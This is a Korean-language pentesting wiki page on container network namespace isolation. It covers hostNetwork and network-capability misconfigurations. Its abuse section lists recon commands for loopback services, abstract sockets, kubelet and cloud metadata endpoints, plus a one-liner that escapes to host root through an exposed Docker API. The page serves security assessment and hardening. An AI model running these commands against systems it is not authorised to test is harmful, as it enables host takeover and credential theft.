# 네트워크 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

네트워크 네임스페이스는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, 방화벽 규칙, 소켓, UNIX-domain abstract socket namespace, 그리고 `/proc/net`과 같은 파일의 내용 등 네트워크와 관련된 리소스를 격리합니다. 따라서 container는 host의 실제 network stack을 소유하지 않아도 자체 `eth0`, 자체 로컬 route, 자체 loopback device를 가진 것처럼 보일 수 있습니다.

보안 측면에서 이는 network isolation이 단순히 port binding보다 훨씬 더 광범위한 문제라는 점에서 중요합니다. private network namespace는 workload가 직접 관찰하거나 재구성할 수 있는 대상을 제한합니다. 해당 namespace가 host와 공유되면 container는 갑자기 host listener, host-local service, abstract AF_UNIX endpoint, 그리고 애플리케이션에 노출될 의도가 전혀 없었던 network control point를 확인할 수 있게 됩니다.

## 동작

새로 생성된 network namespace는 interface가 연결될 때까지 비어 있거나 거의 비어 있는 network environment로 시작합니다. 이후 container runtime은 virtual interface를 생성하거나 연결하고, address를 할당하며, workload가 예상된 connectivity를 갖도록 route를 구성합니다. bridge 기반 deployment에서는 일반적으로 container가 host bridge에 연결된 veth 기반 interface를 확인하게 됩니다. Kubernetes에서는 CNI plugin이 Pod networking에 해당하는 설정을 처리합니다.

이 architecture는 `--network=host` 또는 `hostNetwork: true`가 왜 이처럼 극적인 변경인지 설명해 줍니다. 미리 준비된 private network stack을 받는 대신 workload가 host의 실제 network stack에 참여하게 됩니다.

## 실습

다음 명령으로 거의 비어 있는 network namespace를 확인할 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
또한 다음을 사용하여 일반 컨테이너와 host-networked 컨테이너를 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
호스트 네트워크를 사용하는 container에는 더 이상 자체적으로 격리된 socket 및 interface 뷰가 없습니다. 이 변경 하나만으로도 process에 어떤 capability가 있는지 확인하기 전부터 이미 상당한 의미를 가집니다.

## Runtime 사용

Docker와 Podman은 별도로 구성하지 않는 한 일반적으로 각 container에 private network namespace를 생성합니다. Kubernetes는 보통 각 Pod에 자체 network namespace를 제공하며, 해당 Pod 내부의 container들이 이를 공유하지만 host와는 분리됩니다. 따라서 `127.0.0.1`은 일반적으로 container-local이 아니라 Pod-local입니다. 한 container에서 localhost에만 바인딩된 listener는 일반적으로 해당 Pod의 sidecar 및 sibling container에서 접근할 수 있습니다. Incus/LXC 시스템도 풍부한 network-namespace 기반 격리를 제공하며, 더 다양한 virtual networking 설정을 사용하는 경우가 많습니다.

일반적인 원칙은 private networking이 기본 격리 경계이고, host networking은 해당 경계에서 명시적으로 벗어나는 선택이라는 것입니다.

## 잘못된 구성

가장 중요한 잘못된 구성은 단순히 host network namespace를 공유하는 것입니다. 이는 성능, low-level monitoring 또는 편의를 위해 사용되기도 하지만, container에서 사용할 수 있는 가장 명확한 경계 중 하나를 제거합니다. Host-local listener에 더 직접적으로 접근할 수 있게 되고, localhost 전용 service에 접근할 수 있으며, `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`와 같은 capability는 이를 통해 수행되는 작업이 이제 host 자체의 network 환경에 적용되므로 훨씬 더 위험해집니다.

또 다른 문제는 network namespace가 private인 경우에도 network 관련 capability를 과도하게 부여하는 것입니다. Private namespace는 분명 도움이 되지만, raw socket이나 고급 network 제어를 무해하게 만들지는 않습니다.

Kubernetes에서 `hostNetwork: true`는 Pod 수준의 network segmentation에 어느 정도 신뢰를 둘 수 있는지도 변경합니다. Kubernetes 문서에 따르면 많은 network plugin은 `podSelector` / `namespaceSelector` matching에서 `hostNetwork` Pod의 traffic을 제대로 구분하지 못하며, 따라서 이를 일반적인 node traffic으로 처리합니다. 공격자의 관점에서 이는 침해된 `hostNetwork` workload를 overlay-network workload와 동일한 policy 가정에 의해 여전히 제한되는 일반 Pod가 아니라, node 수준의 network foothold로 취급해야 하는 경우가 많다는 뜻입니다.

## Abuse

격리가 약한 환경에서 공격자는 host의 listening service를 검사하고, loopback에만 바인딩된 management endpoint에 접근하며, 정확한 capability와 환경에 따라 traffic을 sniff하거나 방해할 수 있습니다. 또한 `CAP_NET_ADMIN`이 있으면 routing 및 firewall 상태를 재구성할 수 있습니다. Cluster에서는 이로 인해 lateral movement와 control-plane reconnaissance도 더 쉬워질 수 있습니다.

Host networking을 의심한다면, 먼저 표시되는 interface와 listener가 격리된 container network가 아니라 host에 속한다는 것을 확인하십시오:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback 전용 서비스는 흔히 처음 발견되는 흥미로운 대상입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX socket은 TCP/UDP listener처럼 보이지 않고 `/run` 아래에 filesystem path로 존재하지 않을 수도 있기 때문에 쉽게 놓치는 또 다른 대상입니다. 따라서 host-networked container는 container에 bind-mount된 적이 전혀 없는 host 전용 control channel에 대한 access를 물려받을 수 있습니다:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
역사적인 예로 `containerd-shim` abstract-socket 노출 버그가 있었지만, 특정 CVE보다 더 중요한 broader lesson은 다음과 같습니다. workload가 host network namespace에 참여하면 abstract AF_UNIX services도 attack surface의 일부가 됩니다. 해당 socket이 runtime 관련 또는 administrative 용도로 보이면 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)로 pivot하세요.

network capabilities가 있다면 workload가 보이는 stack을 inspect하거나 alter할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
최신 커널에서는 host networking과 `CAP_NET_ADMIN`을 함께 사용하면 단순한 `iptables` / `nftables` 변경을 넘어 packet path까지 노출될 수 있습니다. `tc` qdisc와 filter도 namespace 범위로 적용되므로, host network namespace를 공유하면 container가 볼 수 있는 host interface에 적용됩니다. 또한 `CAP_BPF`가 있으면 TC 및 XDP loader와 같은 network 관련 eBPF program도 고려 대상이 됩니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
이는 공격자가 단순히 firewall 규칙을 다시 작성하는 것뿐만 아니라, host interface 수준에서 traffic을 mirror, redirect, shape 또는 drop할 수 있기 때문에 중요합니다. private network namespace에서는 이러한 작업이 container의 view 내에 제한되지만, shared host namespace에서는 host에 영향을 미치게 됩니다.

cluster 또는 cloud 환경에서는 host networking이 metadata 및 control-plane 인접 service에 대한 신속한 local recon도 정당화합니다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes에서는 multi-container Pod의 **어떤** container라도 compromise하면 sibling container와 sidecar가 열어 둔 localhost listener에도 접근할 수 있다는 점을 기억해야 합니다. 전체 Pod가 하나의 network namespace를 공유하기 때문입니다. 이는 admin 또는 debug interface가 cluster-wide가 아닌 의도적으로 Pod 내부에서만 접근 가능하도록 설정된 service-mesh, observability 및 helper container에서 특히 중요합니다:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"bound to localhost"를 **Pod-private**가 아니라 **container-private**로 간주하세요. Pod 내 컨테이너 하나가 compromise되면 이 가정은 더 이상 유효하지 않습니다.

### 전체 예시: Host Networking + Local Runtime / Kubelet Access

Host networking이 자동으로 host root를 제공하는 것은 아니지만, node 자체에서만 의도적으로 접근할 수 있는 service가 노출되는 경우가 많습니다. 이러한 service 중 하나라도 보호가 취약하면, host networking은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
로컬호스트의 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- 적절한 보호 없이 local runtime API가 노출된 경우 직접적인 host compromise
- kubelet 또는 local agents에 접근할 수 있는 경우 cluster reconnaissance 또는 lateral movement
- `CAP_NET_ADMIN`과 결합될 경우 traffic manipulation 또는 denial of service

## 확인

이 확인의 목적은 프로세스가 private network stack을 사용하는지, 어떤 routes와 listeners가 표시되는지, 그리고 capabilities를 테스트하기도 전에 network view가 이미 host와 유사하게 보이는지를 파악하는 것입니다.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
여기서 중요한 점:

- `/proc/self/ns/net` 및 `/proc/1/ns/net`이 이미 호스트와 유사하게 보인다면, 해당 container가 host network namespace 또는 다른 비전용 namespace를 공유하고 있을 수 있습니다.
- shell이 이미 named 또는 persistent namespace 내부에 있고 이를 호스트 측의 `/run/netns` 객체와 연관 지으려는 경우 `lsns -t net` 및 `ip netns identify`가 유용합니다.
- `ss -lntup`는 loopback 전용 listener와 로컬 management endpoint를 보여 주므로 특히 유용합니다. `ss -xap` 및 `/proc/net/unix`는 일반적인 filesystem socket 탐색으로는 놓치는 abstract-socket 관점을 추가합니다.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` 또는 `CAP_BPF`가 있다면 route, interface name, firewall context, `tc` state 및 eBPF attachment가 훨씬 더 중요해집니다.
- Kubernetes에서 `hostNetwork` Pod의 service-name resolution이 실패하는 경우, service가 없는 것이 아니라 해당 Pod가 `dnsPolicy: ClusterFirstWithHostNet`을 사용하지 않기 때문일 수 있습니다.
- multi-container Pod에서는 localhost listener가 전체 Pod network namespace에 속하므로, loopback 전용 port가 compromised container에서 접근할 수 없다고 가정하기 전에 sidecar와 sibling container를 확인해야 합니다.

container를 검토할 때는 항상 capability set과 함께 network namespace를 평가해야 합니다. Host networking과 강력한 network capability가 함께 있는 경우는 bridge networking과 제한적인 default capability set이 있는 경우와 보안 상태가 크게 다릅니다.

## References

- [Kubernetes NetworkPolicy 및 `hostNetwork` 관련 주의사항](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` 및 abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network container에 노출된 abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [network-related eBPF program에 필요한 eBPF token 및 capability](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
